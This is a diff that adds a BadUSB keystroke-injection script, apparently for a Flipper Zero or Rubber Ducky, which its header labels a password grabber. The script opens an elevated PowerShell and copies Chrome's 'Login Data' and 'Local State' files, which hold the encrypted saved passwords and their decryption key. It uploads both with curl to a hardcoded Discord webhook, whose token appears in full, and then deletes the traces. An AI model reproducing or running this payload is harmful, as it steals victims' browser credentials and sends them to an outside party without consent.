@@ -1,0 +1,23 @@
+REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
+REM Description: Copies the chrome login file and sends it to a discord webhook.
+REM Version:	1.0
+REM Category:	Passwords
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+ALTSTRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+ALTSTRING $hookurl = "https://discordapp.com/api/webhooks/1072089204504412192/eOgG2qvFTLB9KTtMsW0SvZu23f60Xxo11lErJIkNKIrs-QgAkZ4NkIRLw1zaNBUeCjbV"
+ENTER
+DELAY 300
+ALTSTRING function Upload-Discord {[CmdletBinding()] param([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text) $Body = @{'username' = $env:username; 'content' = $text}; if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri https://discordapp.com/api/webhooks/1072089204504412192/eOgG2qvFTLB9KTtMsW0SvZu23f60Xxo11lErJIkNKIrs-QgAkZ4NkIRLw1zaNBUeCjbV -Method Post -Body ($Body | ConvertTo-Json)}; if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" https://discordapp.com/api/webhooks/1072089204504412192/eOgG2qvFTLB9KTtMsW0SvZu23f60Xxo11lErJIkNKIrs-QgAkZ4NkIRLw1zaNBUeCjbV}}; $sourceFile = $env:LOCALAPPDATA+'\Google\Chrome\User Data\\Default\\Login Data'; $outputFile = "c:\output.txt"; Copy-Item $sourceFile $outputFile; Upload-Discord -file $outputFile -text "Encrypted Login Data"; Remove-Item $outputFile
+ENTER
+DELAY 1000
+ALTSTRING $sourceFile = $env:LOCALAPPDATA+'\Google\Chrome\User Data\\Local State'; $outputFile = "c:\key.txt"; Copy-Item $sourceFile $outputFile; Upload-Discord -file $outputFile -text "Key-File"; Remove-Item $outputFile
+ENTER
+DELAY 200
+STRING exit
+ENTER
